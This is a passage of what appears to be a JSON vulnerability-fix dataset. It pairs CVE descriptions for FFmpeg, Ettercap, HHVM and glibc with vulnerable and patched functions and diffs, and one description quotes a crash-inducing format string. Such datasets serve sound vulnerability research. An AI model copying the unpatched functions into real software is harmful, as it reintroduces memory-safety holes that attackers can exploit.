        "func": "static int cinepak_decode_vectors (CinepakContext *s, cvid_strip *strip,\n                                   int chunk_id, int size, const uint8_t *data)\n{\n    const uint8_t   *eod = (data + size);\n    uint32_t         flag, mask;\n    uint8_t         *cb0, *cb1, *cb2, *cb3;\n    int             x, y;\n    char            *ip0, *ip1, *ip2, *ip3;\n\n    flag = 0;\n    mask = 0;\n\n    for (y=strip->y1; y < strip->y2; y+=4) {\n\n/* take care of y dimension not being multiple of 4, such streams exist */\n        ip0 = ip1 = ip2 = ip3 = s->frame->data[0] +\n          (s->palette_video?strip->x1:strip->x1*3) + (y * s->frame->linesize[0]);\n        if(s->avctx->height - y > 1) {\n            ip1 = ip0 + s->frame->linesize[0];\n            if(s->avctx->height - y > 2) {\n                ip2 = ip1 + s->frame->linesize[0];\n                if(s->avctx->height - y > 3) {\n                    ip3 = ip2 + s->frame->linesize[0];\n                }\n            }\n        }\n/* to get the correct picture for not-multiple-of-4 cases let us fill\n * each block from the bottom up, thus possibly overwriting the top line\n * more than once but ending with the correct data in place\n * (instead of in-loop checking) */\n\n        for (x=strip->x1; x < strip->x2; x+=4) {\n            if ((chunk_id & 0x01) && !(mask >>= 1)) {\n                if ((data + 4) > eod)\n                    return AVERROR_INVALIDDATA;\n\n                flag  = AV_RB32 (data);\n                data += 4;\n                mask  = 0x80000000;\n            }\n\n            if (!(chunk_id & 0x01) || (flag & mask)) {\n                if (!(chunk_id & 0x02) && !(mask >>= 1)) {\n                    if ((data + 4) > eod)\n                        return AVERROR_INVALIDDATA;\n\n                    flag  = AV_RB32 (data);\n                    data += 4;\n                    mask  = 0x80000000;\n                }\n\n                if ((chunk_id & 0x02) || (~flag & mask)) {\n                    uint8_t *p;\n                    if (data >= eod)\n                        return AVERROR_INVALIDDATA;\n\n                    p = strip->v1_codebook[*data++];\n                    if (s->palette_video) {\n                        ip3[0] = ip3[1] = ip2[0] = ip2[1] = p[6];\n                        ip3[2] = ip3[3] = ip2[2] = ip2[3] = p[9];\n                        ip1[0] = ip1[1] = ip0[0] = ip0[1] = p[0];\n                        ip1[2] = ip1[3] = ip0[2] = ip0[3] = p[3];\n                    } else {\n                        p += 6;\n                        memcpy(ip3 + 0, p, 3); memcpy(ip3 + 3, p, 3);\n                        memcpy(ip2 + 0, p, 3); memcpy(ip2 + 3, p, 3);\n                        p += 3; /* ... + 9 */\n                        memcpy(ip3 + 6, p, 3); memcpy(ip3 + 9, p, 3);\n                        memcpy(ip2 + 6, p, 3); memcpy(ip2 + 9, p, 3);\n                        p -= 9; /* ... + 0 */\n                        memcpy(ip1 + 0, p, 3); memcpy(ip1 + 3, p, 3);\n                        memcpy(ip0 + 0, p, 3); memcpy(ip0 + 3, p, 3);\n                        p += 3; /* ... + 3 */\n                        memcpy(ip1 + 6, p, 3); memcpy(ip1 + 9, p, 3);\n                        memcpy(ip0 + 6, p, 3); memcpy(ip0 + 9, p, 3);\n                    }\n\n                } else if (flag & mask) {\n                    if ((data + 4) > eod)\n                        return AVERROR_INVALIDDATA;\n\n                    cb0 = strip->v4_codebook[*data++];\n                    cb1 = strip->v4_codebook[*data++];\n                    cb2 = strip->v4_codebook[*data++];\n                    cb3 = strip->v4_codebook[*data++];\n                    if (s->palette_video) {\n                        uint8_t *p;\n                        p = ip3;\n                        *p++ = cb2[6];\n                        *p++ = cb2[9];\n                        *p++ = cb3[6];\n                        *p   = cb3[9];\n                        p = ip2;\n                        *p++ = cb2[0];\n                        *p++ = cb2[3];\n                        *p++ = cb3[0];\n                        *p   = cb3[3];\n                        p = ip1;\n                        *p++ = cb0[6];\n                        *p++ = cb0[9];\n                        *p++ = cb1[6];\n                        *p   = cb1[9];\n                        p = ip0;\n                        *p++ = cb0[0];\n                        *p++ = cb0[3];\n                        *p++ = cb1[0];\n                        *p   = cb1[3];\n                    } else {\n                        memcpy(ip3 + 0, cb2 + 6, 6);\n                        memcpy(ip3 + 6, cb3 + 6, 6);\n                        memcpy(ip2 + 0, cb2 + 0, 6);\n                        memcpy(ip2 + 6, cb3 + 0, 6);\n                        memcpy(ip1 + 0, cb0 + 6, 6);\n                        memcpy(ip1 + 6, cb1 + 6, 6);\n                        memcpy(ip0 + 0, cb0 + 0, 6);\n                        memcpy(ip0 + 6, cb1 + 0, 6);\n                    }\n\n                }\n            }\n\n            if (s->palette_video) {\n                ip0 += 4;  ip1 += 4;\n                ip2 += 4;  ip3 += 4;\n            } else {\n                ip0 += 12;  ip1 += 12;\n                ip2 += 12;  ip3 += 12;\n            }\n        }\n    }\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,7 +4,7 @@\n     const uint8_t   *eod = (data + size);\n     uint32_t         flag, mask;\n     uint8_t         *cb0, *cb1, *cb2, *cb3;\n-    unsigned int     x, y;\n+    int             x, y;\n     char            *ip0, *ip1, *ip2, *ip3;\n \n     flag = 0;",
        "diff_line_info": {
            "deleted_lines": [
                "    unsigned int     x, y;"
            ],
            "added_lines": [
                "    int             x, y;"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-8549",
        "func_name": "ffmpeg/on2avc_decode_init",
        "description": "libavcodec/on2avc.c in FFmpeg before 2.4.2 does not constrain the number of channels to at most 2, which allows remote attackers to cause a denial of service (out-of-bounds access) or possibly have unspecified other impact via crafted On2 data.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=550f3e9df3410b3dd975e590042c0d83e20a8da3",
        "commit_title": "",
        "commit_text": "avcodec/on2avc: Check number of channels  Fixes out of array access  ",
        "func_before": "static av_cold int on2avc_decode_init(AVCodecContext *avctx)\n{\n    On2AVCContext *c = avctx->priv_data;\n    int i;\n\n    c->avctx = avctx;\n    avctx->sample_fmt     = AV_SAMPLE_FMT_FLTP;\n    avctx->channel_layout = (avctx->channels == 2) ? AV_CH_LAYOUT_STEREO\n                                                   : AV_CH_LAYOUT_MONO;\n\n    c->is_av500 = (avctx->codec_tag == 0x500);\n    if (c->is_av500 && avctx->channels == 2) {\n        av_log(avctx, AV_LOG_ERROR, \"0x500 version should be mono\\n\");\n        return AVERROR_INVALIDDATA;\n    }\n    if (avctx->channels == 2)\n        av_log(avctx, AV_LOG_WARNING,\n               \"Stereo mode support is not good, patch is welcome\\n\");\n\n    for (i = 0; i < 20; i++)\n        c->scale_tab[i] = ceil(pow(10.0, i * 0.1) * 16) / 32;\n    for (; i < 128; i++)\n        c->scale_tab[i] = ceil(pow(10.0, i * 0.1) * 0.5);\n\n    if (avctx->sample_rate < 32000 || avctx->channels == 1)\n        memcpy(c->long_win, ff_on2avc_window_long_24000,\n               1024 * sizeof(*c->long_win));\n    else\n        memcpy(c->long_win, ff_on2avc_window_long_32000,\n               1024 * sizeof(*c->long_win));\n    memcpy(c->short_win, ff_on2avc_window_short, 128 * sizeof(*c->short_win));\n\n    c->modes = (avctx->sample_rate <= 40000) ? ff_on2avc_modes_40\n                                             : ff_on2avc_modes_44;\n    c->wtf   = (avctx->sample_rate <= 40000) ? wtf_40\n                                             : wtf_44;\n\n    ff_mdct_init(&c->mdct,       11, 1, 1.0 / (32768.0 * 1024.0));\n    ff_mdct_init(&c->mdct_half,  10, 1, 1.0 / (32768.0 * 512.0));\n    ff_mdct_init(&c->mdct_small,  8, 1, 1.0 / (32768.0 * 128.0));\n    ff_fft_init(&c->fft128,  6, 0);\n    ff_fft_init(&c->fft256,  7, 0);\n    ff_fft_init(&c->fft512,  8, 1);\n    ff_fft_init(&c->fft1024, 9, 1);\n    avpriv_float_dsp_init(&c->fdsp, avctx->flags & CODEC_FLAG_BITEXACT);\n\n    if (init_vlc(&c->scale_diff, 9, ON2AVC_SCALE_DIFFS,\n                 ff_on2avc_scale_diff_bits,  1, 1,\n                 ff_on2avc_scale_diff_codes, 4, 4, 0)) {\n        av_log(avctx, AV_LOG_ERROR, \"Cannot init VLC\\n\");\n        return AVERROR(ENOMEM);\n    }\n    for (i = 1; i < 9; i++) {\n        int idx = i - 1;\n        if (ff_init_vlc_sparse(&c->cb_vlc[i], 9, ff_on2avc_quad_cb_elems[idx],\n                               ff_on2avc_quad_cb_bits[idx],  1, 1,\n                               ff_on2avc_quad_cb_codes[idx], 4, 4,\n                               ff_on2avc_quad_cb_syms[idx],  2, 2, 0)) {\n            av_log(avctx, AV_LOG_ERROR, \"Cannot init VLC\\n\");\n            on2avc_free_vlcs(c);\n            return AVERROR(ENOMEM);\n        }\n    }\n    for (i = 9; i < 16; i++) {\n        int idx = i - 9;\n        if (ff_init_vlc_sparse(&c->cb_vlc[i], 9, ff_on2avc_pair_cb_elems[idx],\n                               ff_on2avc_pair_cb_bits[idx],  1, 1,\n                               ff_on2avc_pair_cb_codes[idx], 2, 2,\n                               ff_on2avc_pair_cb_syms[idx],  2, 2, 0)) {\n            av_log(avctx, AV_LOG_ERROR, \"Cannot init VLC\\n\");\n            on2avc_free_vlcs(c);\n            return AVERROR(ENOMEM);\n        }\n    }\n\n    return 0;\n}",
        "func": "static av_cold int on2avc_decode_init(AVCodecContext *avctx)\n{\n    On2AVCContext *c = avctx->priv_data;\n    int i;\n\n    if (avctx->channels > 2U) {\n        avpriv_request_sample(avctx, \"Decoding more than 2 channels\");\n        return AVERROR_PATCHWELCOME;\n    }\n\n    c->avctx = avctx;\n    avctx->sample_fmt     = AV_SAMPLE_FMT_FLTP;\n    avctx->channel_layout = (avctx->channels == 2) ? AV_CH_LAYOUT_STEREO\n                                                   : AV_CH_LAYOUT_MONO;\n\n    c->is_av500 = (avctx->codec_tag == 0x500);\n    if (c->is_av500 && avctx->channels == 2) {\n        av_log(avctx, AV_LOG_ERROR, \"0x500 version should be mono\\n\");\n        return AVERROR_INVALIDDATA;\n    }\n    if (avctx->channels == 2)\n        av_log(avctx, AV_LOG_WARNING,\n               \"Stereo mode support is not good, patch is welcome\\n\");\n\n    for (i = 0; i < 20; i++)\n        c->scale_tab[i] = ceil(pow(10.0, i * 0.1) * 16) / 32;\n    for (; i < 128; i++)\n        c->scale_tab[i] = ceil(pow(10.0, i * 0.1) * 0.5);\n\n    if (avctx->sample_rate < 32000 || avctx->channels == 1)\n        memcpy(c->long_win, ff_on2avc_window_long_24000,\n               1024 * sizeof(*c->long_win));\n    else\n        memcpy(c->long_win, ff_on2avc_window_long_32000,\n               1024 * sizeof(*c->long_win));\n    memcpy(c->short_win, ff_on2avc_window_short, 128 * sizeof(*c->short_win));\n\n    c->modes = (avctx->sample_rate <= 40000) ? ff_on2avc_modes_40\n                                             : ff_on2avc_modes_44;\n    c->wtf   = (avctx->sample_rate <= 40000) ? wtf_40\n                                             : wtf_44;\n\n    ff_mdct_init(&c->mdct,       11, 1, 1.0 / (32768.0 * 1024.0));\n    ff_mdct_init(&c->mdct_half,  10, 1, 1.0 / (32768.0 * 512.0));\n    ff_mdct_init(&c->mdct_small,  8, 1, 1.0 / (32768.0 * 128.0));\n    ff_fft_init(&c->fft128,  6, 0);\n    ff_fft_init(&c->fft256,  7, 0);\n    ff_fft_init(&c->fft512,  8, 1);\n    ff_fft_init(&c->fft1024, 9, 1);\n    avpriv_float_dsp_init(&c->fdsp, avctx->flags & CODEC_FLAG_BITEXACT);\n\n    if (init_vlc(&c->scale_diff, 9, ON2AVC_SCALE_DIFFS,\n                 ff_on2avc_scale_diff_bits,  1, 1,\n                 ff_on2avc_scale_diff_codes, 4, 4, 0)) {\n        av_log(avctx, AV_LOG_ERROR, \"Cannot init VLC\\n\");\n        return AVERROR(ENOMEM);\n    }\n    for (i = 1; i < 9; i++) {\n        int idx = i - 1;\n        if (ff_init_vlc_sparse(&c->cb_vlc[i], 9, ff_on2avc_quad_cb_elems[idx],\n                               ff_on2avc_quad_cb_bits[idx],  1, 1,\n                               ff_on2avc_quad_cb_codes[idx], 4, 4,\n                               ff_on2avc_quad_cb_syms[idx],  2, 2, 0)) {\n            av_log(avctx, AV_LOG_ERROR, \"Cannot init VLC\\n\");\n            on2avc_free_vlcs(c);\n            return AVERROR(ENOMEM);\n        }\n    }\n    for (i = 9; i < 16; i++) {\n        int idx = i - 9;\n        if (ff_init_vlc_sparse(&c->cb_vlc[i], 9, ff_on2avc_pair_cb_elems[idx],\n                               ff_on2avc_pair_cb_bits[idx],  1, 1,\n                               ff_on2avc_pair_cb_codes[idx], 2, 2,\n                               ff_on2avc_pair_cb_syms[idx],  2, 2, 0)) {\n            av_log(avctx, AV_LOG_ERROR, \"Cannot init VLC\\n\");\n            on2avc_free_vlcs(c);\n            return AVERROR(ENOMEM);\n        }\n    }\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,6 +2,11 @@\n {\n     On2AVCContext *c = avctx->priv_data;\n     int i;\n+\n+    if (avctx->channels > 2U) {\n+        avpriv_request_sample(avctx, \"Decoding more than 2 channels\");\n+        return AVERROR_PATCHWELCOME;\n+    }\n \n     c->avctx = avctx;\n     avctx->sample_fmt     = AV_SAMPLE_FMT_FLTP;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "    if (avctx->channels > 2U) {",
                "        avpriv_request_sample(avctx, \"Decoding more than 2 channels\");",
                "        return AVERROR_PATCHWELCOME;",
                "    }"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-9376",
        "func_name": "Ettercap/ettercap/get_decode_len",
        "description": "Integer underflow in Ettercap 0.8.1 allows remote attackers to cause a denial of service (out-of-bounds write) and possibly execute arbitrary code via a small (1) size variable value in the dissector_dhcp function in dissectors/ec_dhcp.c, (2) length value to the dissector_gg function in dissectors/ec_gg.c, or (3) string length to the get_decode_len function in ec_utils.c or a request without a (4) username or (5) password to the dissector_TN3270 function in dissectors/ec_TN3270.c.",
        "git_url": "https://github.com/Ettercap/ettercap/commit/afe7061948e85f0a0fd417d5e4c681bfaf212f42",
        "commit_title": "Fix get_decode_len ignored strlen return value",
        "commit_text": "",
        "func_before": "int get_decode_len(const char *b64_str) {\n   int len = strlen(b64_str);\n   int padding = 0;\n   if (b64_str[len-1] == '=' && b64_str[len-2] == '=')\n      padding = 2;\n   else if (b64_str[len-1] == '=')\n      padding = 1;\n   return (int)len*0.75 - padding;\n}",
        "func": "int get_decode_len(const char *b64_str) {\n   int len = strlen(b64_str);\n   int padding = 0;\n\n   if (len < 2)\n       return 0;\n\n   if (b64_str[len-1] == '=' && b64_str[len-2] == '=')\n      padding = 2;\n   else if (b64_str[len-1] == '=')\n      padding = 1;\n   return (int)len*0.75 - padding;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,10 @@\n int get_decode_len(const char *b64_str) {\n    int len = strlen(b64_str);\n    int padding = 0;\n+\n+   if (len < 2)\n+       return 0;\n+\n    if (b64_str[len-1] == '=' && b64_str[len-2] == '=')\n       padding = 2;\n    else if (b64_str[len-1] == '=')",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "   if (len < 2)",
                "       return 0;",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2014-6228",
        "func_name": "facebook/hhvm/string_chunk_split",
        "description": "Integer overflow in the string_chunk_split function in hphp/runtime/base/zend-string.cpp in Facebook HipHop Virtual Machine (HHVM) before 3.3.0 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via crafted arguments to the chunk_split function.",
        "git_url": "https://github.com/facebook/hhvm/commit/1f91e076a585118495b976a413c1df40f6fd3d41",
        "commit_title": "Fix integer overflow in chunk_split",
        "commit_text": " Reviewed By: @ptarjan  Differential Revision: D1515947",
        "func_before": "String string_chunk_split(const char *src, int srclen, const char *end,\n                          int endlen, int chunklen) {\n  int chunks = srclen / chunklen; // complete chunks!\n  int restlen = srclen - chunks * chunklen; /* srclen % chunklen */\n\n  int out_len = (chunks + 1) * endlen + srclen;\n  String ret(out_len, ReserveString);\n  char *dest = ret.bufferSlice().ptr;\n\n  const char *p; char *q;\n  const char *pMax = src + srclen - chunklen + 1;\n  for (p = src, q = dest; p < pMax; ) {\n    memcpy(q, p, chunklen);\n    q += chunklen;\n    memcpy(q, end, endlen);\n    q += endlen;\n    p += chunklen;\n  }\n\n  if (restlen) {\n    memcpy(q, p, restlen);\n    q += restlen;\n    memcpy(q, end, endlen);\n    q += endlen;\n  }\n\n  ret.setSize(q - dest);\n  return ret;\n}",
        "func": "String string_chunk_split(const char *src, int srclen, const char *end,\n                          int endlen, int chunklen) {\n  int chunks = srclen / chunklen; // complete chunks!\n  int restlen = srclen - chunks * chunklen; /* srclen % chunklen */\n\n  String ret(\n    safe_address(\n      chunks + 1,\n      endlen,\n      srclen\n    ),\n    ReserveString\n  );\n  char *dest = ret.bufferSlice().ptr;\n\n  const char *p; char *q;\n  const char *pMax = src + srclen - chunklen + 1;\n  for (p = src, q = dest; p < pMax; ) {\n    memcpy(q, p, chunklen);\n    q += chunklen;\n    memcpy(q, end, endlen);\n    q += endlen;\n    p += chunklen;\n  }\n\n  if (restlen) {\n    memcpy(q, p, restlen);\n    q += restlen;\n    memcpy(q, end, endlen);\n    q += endlen;\n  }\n\n  ret.setSize(q - dest);\n  return ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -3,8 +3,14 @@\n   int chunks = srclen / chunklen; // complete chunks!\n   int restlen = srclen - chunks * chunklen; /* srclen % chunklen */\n \n-  int out_len = (chunks + 1) * endlen + srclen;\n-  String ret(out_len, ReserveString);\n+  String ret(\n+    safe_address(\n+      chunks + 1,\n+      endlen,\n+      srclen\n+    ),\n+    ReserveString\n+  );\n   char *dest = ret.bufferSlice().ptr;\n \n   const char *p; char *q;",
        "diff_line_info": {
            "deleted_lines": [
                "  int out_len = (chunks + 1) * endlen + srclen;",
                "  String ret(out_len, ReserveString);"
            ],
            "added_lines": [
                "  String ret(",
                "    safe_address(",
                "      chunks + 1,",
                "      endlen,",
                "      srclen",
                "    ),",
                "    ReserveString",
                "  );"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-9604",
        "func_name": "ffmpeg/restore_median",
        "description": "libavcodec/utvideodec.c in FFmpeg before 2.5.2 does not check for a zero value of a slice height, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Ut Video data, related to the (1) restore_median and (2) restore_median_il functions.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=3881606240953b9275a247a1c98a567f3c44890f",
        "commit_title": "",
        "commit_text": "avcodec/utvideodec: Fix handling of slice_height=0  Fixes out of array accesses ",
        "func_before": "static void restore_median(uint8_t *src, int step, int stride,\n                           int width, int height, int slices, int rmode)\n{\n    int i, j, slice;\n    int A, B, C;\n    uint8_t *bsrc;\n    int slice_start, slice_height;\n    const int cmask = ~rmode;\n\n    for (slice = 0; slice < slices; slice++) {\n        slice_start  = ((slice * height) / slices) & cmask;\n        slice_height = ((((slice + 1) * height) / slices) & cmask) -\n                       slice_start;\n\n        bsrc = src + slice_start * stride;\n\n        // first line - left neighbour prediction\n        bsrc[0] += 0x80;\n        A = bsrc[0];\n        for (i = step; i < width * step; i += step) {\n            bsrc[i] += A;\n            A        = bsrc[i];\n        }\n        bsrc += stride;\n        if (slice_height <= 1)\n            continue;\n        // second line - first element has top prediction, the rest uses median\n        C        = bsrc[-stride];\n        bsrc[0] += C;\n        A        = bsrc[0];\n        for (i = step; i < width * step; i += step) {\n            B        = bsrc[i - stride];\n            bsrc[i] += mid_pred(A, B, (uint8_t)(A + B - C));\n            C        = B;\n            A        = bsrc[i];\n        }\n        bsrc += stride;\n        // the rest of lines use continuous median prediction\n        for (j = 2; j < slice_height; j++) {\n            for (i = 0; i < width * step; i += step) {\n                B        = bsrc[i - stride];\n                bsrc[i] += mid_pred(A, B, (uint8_t)(A + B - C));\n                C        = B;\n                A        = bsrc[i];\n            }\n            bsrc += stride;\n        }\n    }\n}",
        "func": "static void restore_median(uint8_t *src, int step, int stride,\n                           int width, int height, int slices, int rmode)\n{\n    int i, j, slice;\n    int A, B, C;\n    uint8_t *bsrc;\n    int slice_start, slice_height;\n    const int cmask = ~rmode;\n\n    for (slice = 0; slice < slices; slice++) {\n        slice_start  = ((slice * height) / slices) & cmask;\n        slice_height = ((((slice + 1) * height) / slices) & cmask) -\n                       slice_start;\n\n        if (!slice_height)\n            continue;\n        bsrc = src + slice_start * stride;\n\n        // first line - left neighbour prediction\n        bsrc[0] += 0x80;\n        A = bsrc[0];\n        for (i = step; i < width * step; i += step) {\n            bsrc[i] += A;\n            A        = bsrc[i];\n        }\n        bsrc += stride;\n        if (slice_height <= 1)\n            continue;\n        // second line - first element has top prediction, the rest uses median\n        C        = bsrc[-stride];\n        bsrc[0] += C;\n        A        = bsrc[0];\n        for (i = step; i < width * step; i += step) {\n            B        = bsrc[i - stride];\n            bsrc[i] += mid_pred(A, B, (uint8_t)(A + B - C));\n            C        = B;\n            A        = bsrc[i];\n        }\n        bsrc += stride;\n        // the rest of lines use continuous median prediction\n        for (j = 2; j < slice_height; j++) {\n            for (i = 0; i < width * step; i += step) {\n                B        = bsrc[i - stride];\n                bsrc[i] += mid_pred(A, B, (uint8_t)(A + B - C));\n                C        = B;\n                A        = bsrc[i];\n            }\n            bsrc += stride;\n        }\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -12,6 +12,8 @@\n         slice_height = ((((slice + 1) * height) / slices) & cmask) -\n                        slice_start;\n \n+        if (!slice_height)\n+            continue;\n         bsrc = src + slice_start * stride;\n \n         // first line - left neighbour prediction",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "        if (!slice_height)",
                "            continue;"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-9604",
        "func_name": "ffmpeg/restore_median_il",
        "description": "libavcodec/utvideodec.c in FFmpeg before 2.5.2 does not check for a zero value of a slice height, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Ut Video data, related to the (1) restore_median and (2) restore_median_il functions.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=3881606240953b9275a247a1c98a567f3c44890f",
        "commit_title": "",
        "commit_text": "avcodec/utvideodec: Fix handling of slice_height=0  Fixes out of array accesses ",
        "func_before": "static void restore_median_il(uint8_t *src, int step, int stride,\n                              int width, int height, int slices, int rmode)\n{\n    int i, j, slice;\n    int A, B, C;\n    uint8_t *bsrc;\n    int slice_start, slice_height;\n    const int cmask   = ~(rmode ? 3 : 1);\n    const int stride2 = stride << 1;\n\n    for (slice = 0; slice < slices; slice++) {\n        slice_start    = ((slice * height) / slices) & cmask;\n        slice_height   = ((((slice + 1) * height) / slices) & cmask) -\n                         slice_start;\n        slice_height >>= 1;\n\n        bsrc = src + slice_start * stride;\n\n        // first line - left neighbour prediction\n        bsrc[0] += 0x80;\n        A        = bsrc[0];\n        for (i = step; i < width * step; i += step) {\n            bsrc[i] += A;\n            A        = bsrc[i];\n        }\n        for (i = 0; i < width * step; i += step) {\n            bsrc[stride + i] += A;\n            A                 = bsrc[stride + i];\n        }\n        bsrc += stride2;\n        if (slice_height <= 1)\n            continue;\n        // second line - first element has top prediction, the rest uses median\n        C        = bsrc[-stride2];\n        bsrc[0] += C;\n        A        = bsrc[0];\n        for (i = step; i < width * step; i += step) {\n            B        = bsrc[i - stride2];\n            bsrc[i] += mid_pred(A, B, (uint8_t)(A + B - C));\n            C        = B;\n            A        = bsrc[i];\n        }\n        for (i = 0; i < width * step; i += step) {\n            B                 = bsrc[i - stride];\n            bsrc[stride + i] += mid_pred(A, B, (uint8_t)(A + B - C));\n            C                 = B;\n            A                 = bsrc[stride + i];\n        }\n        bsrc += stride2;\n        // the rest of lines use continuous median prediction\n        for (j = 2; j < slice_height; j++) {\n            for (i = 0; i < width * step; i += step) {\n                B        = bsrc[i - stride2];\n                bsrc[i] += mid_pred(A, B, (uint8_t)(A + B - C));\n                C        = B;\n                A        = bsrc[i];\n            }\n            for (i = 0; i < width * step; i += step) {\n                B                 = bsrc[i - stride];\n                bsrc[i + stride] += mid_pred(A, B, (uint8_t)(A + B - C));\n                C                 = B;\n                A                 = bsrc[i + stride];\n            }\n            bsrc += stride2;\n        }\n    }\n}",
        "func": "static void restore_median_il(uint8_t *src, int step, int stride,\n                              int width, int height, int slices, int rmode)\n{\n    int i, j, slice;\n    int A, B, C;\n    uint8_t *bsrc;\n    int slice_start, slice_height;\n    const int cmask   = ~(rmode ? 3 : 1);\n    const int stride2 = stride << 1;\n\n    for (slice = 0; slice < slices; slice++) {\n        slice_start    = ((slice * height) / slices) & cmask;\n        slice_height   = ((((slice + 1) * height) / slices) & cmask) -\n                         slice_start;\n        slice_height >>= 1;\n        if (!slice_height)\n            continue;\n\n        bsrc = src + slice_start * stride;\n\n        // first line - left neighbour prediction\n        bsrc[0] += 0x80;\n        A        = bsrc[0];\n        for (i = step; i < width * step; i += step) {\n            bsrc[i] += A;\n            A        = bsrc[i];\n        }\n        for (i = 0; i < width * step; i += step) {\n            bsrc[stride + i] += A;\n            A                 = bsrc[stride + i];\n        }\n        bsrc += stride2;\n        if (slice_height <= 1)\n            continue;\n        // second line - first element has top prediction, the rest uses median\n        C        = bsrc[-stride2];\n        bsrc[0] += C;\n        A        = bsrc[0];\n        for (i = step; i < width * step; i += step) {\n            B        = bsrc[i - stride2];\n            bsrc[i] += mid_pred(A, B, (uint8_t)(A + B - C));\n            C        = B;\n            A        = bsrc[i];\n        }\n        for (i = 0; i < width * step; i += step) {\n            B                 = bsrc[i - stride];\n            bsrc[stride + i] += mid_pred(A, B, (uint8_t)(A + B - C));\n            C                 = B;\n            A                 = bsrc[stride + i];\n        }\n        bsrc += stride2;\n        // the rest of lines use continuous median prediction\n        for (j = 2; j < slice_height; j++) {\n            for (i = 0; i < width * step; i += step) {\n                B        = bsrc[i - stride2];\n                bsrc[i] += mid_pred(A, B, (uint8_t)(A + B - C));\n                C        = B;\n                A        = bsrc[i];\n            }\n            for (i = 0; i < width * step; i += step) {\n                B                 = bsrc[i - stride];\n                bsrc[i + stride] += mid_pred(A, B, (uint8_t)(A + B - C));\n                C                 = B;\n                A                 = bsrc[i + stride];\n            }\n            bsrc += stride2;\n        }\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -13,6 +13,8 @@\n         slice_height   = ((((slice + 1) * height) / slices) & cmask) -\n                          slice_start;\n         slice_height >>= 1;\n+        if (!slice_height)\n+            continue;\n \n         bsrc = src + slice_start * stride;\n ",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "        if (!slice_height)",
                "            continue;"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-4881",
        "func_name": "glibc/__vstrfmon_l",
        "description": "Integer overflow in the __vstrfmon_l function in stdlib/strfmon_l.c in the strfmon implementation in the GNU C Library (aka glibc or libc6) before 2.10.1 allows context-dependent attackers to cause a denial of service (application crash) via a crafted format string, as demonstrated by the %99999999999999999999n string, a related issue to CVE-2008-1391.",
        "git_url": "http://sourceware.org/git/?p=glibc.git;a=commit;h=153aa31b93be22e01b236375fb02a9f9b9a0195f",
        "commit_title": "",
        "commit_text": "* stdlib/strfmon_l.c (__vstrfmon_l): Don't wrap when computing width.  \tNumerically stable check for valid width. ",
        "func_before": "ssize_t\n__vstrfmon_l (char *s, size_t maxsize, __locale_t loc, const char *format,\n\t      va_list ap)\n{\n  struct locale_data *current = loc->__locales[LC_MONETARY];\n  _IO_strfile f;\n#ifdef _IO_MTSAFE_IO\n  _IO_lock_t lock;\n#endif\n  struct printf_info info;\n  char *dest;\t\t\t/* Pointer so copy the output.  */\n  const char *fmt;\t\t/* Pointer that walks through format.  */\n\n  dest = s;\n  fmt = format;\n\n  /* Loop through the format-string.  */\n  while (*fmt != '\\0')\n    {\n      /* The floating-point value to output.  */\n      union\n      {\n\tdouble dbl;\n\t__long_double_t ldbl;\n      }\n      fpnum;\n      int int_format;\n      int print_curr_symbol;\n      int left_prec;\n      int left_pad;\n      int right_prec;\n      int group;\n      char pad;\n      int is_long_double;\n      int p_sign_posn;\n      int n_sign_posn;\n      int sign_posn;\n      int other_sign_posn;\n      int left;\n      int is_negative;\n      int sep_by_space;\n      int other_sep_by_space;\n      int cs_precedes;\n      int other_cs_precedes;\n      const char *sign_string;\n      const char *other_sign_string;\n      int done;\n      const char *currency_symbol;\n      size_t currency_symbol_len;\n      int width;\n      char *startp;\n      const void *ptr;\n      char space_char;\n\n      /* Process all character which do not introduce a format\n\t specification.  */\n      if (*fmt != '%')\n\t{\n\t  out_char (*fmt++);\n\t  continue;\n\t}\n\n      /* \"%%\" means a single '%' character.  */\n      if (fmt[1] == '%')\n\t{\n\t  out_char (*++fmt);\n\t  ++fmt;\n\t  continue;\n\t}\n\n      /* Defaults for formatting.  */\n      int_format = 0;\t\t\t/* Use international curr. symbol */\n      print_curr_symbol = 1;\t\t/* Print the currency symbol.  */\n      left_prec = -1;\t\t\t/* No left precision specified.  */\n      right_prec = -1;\t\t\t/* No right precision specified.  */\n      group = 1;\t\t\t/* Print digits grouped.  */\n      pad = ' ';\t\t\t/* Fill character is <SP>.  */\n      is_long_double = 0;\t\t/* Double argument by default.  */\n      p_sign_posn = -1;\t\t\t/* This indicates whether the */\n      n_sign_posn = -1;\t\t\t/* '(' flag is given.  */\n      width = -1;\t\t\t/* No width specified so far.  */\n      left = 0;\t\t\t\t/* Right justified by default.  */\n\n      /* Parse group characters.  */\n      while (1)\n\t{\n\t  switch (*++fmt)\n\t    {\n\t    case '=':\t\t\t/* Set fill character.  */\n\t      pad = *++fmt;\n\t      if (pad == '\\0')\n\t\t{\n\t\t  /* Premature EOS.  */\n\t\t  __set_errno (EINVAL);\n\t\t  return -1;\n\t\t}\n\t      continue;\n\t    case '^':\t\t\t/* Don't group digits.  */\n\t      group = 0;\n\t      continue;\n\t    case '+':\t\t\t/* Use +/- for sign of number.  */\n\t      if (n_sign_posn != -1)\n\t\t{\n\t\t  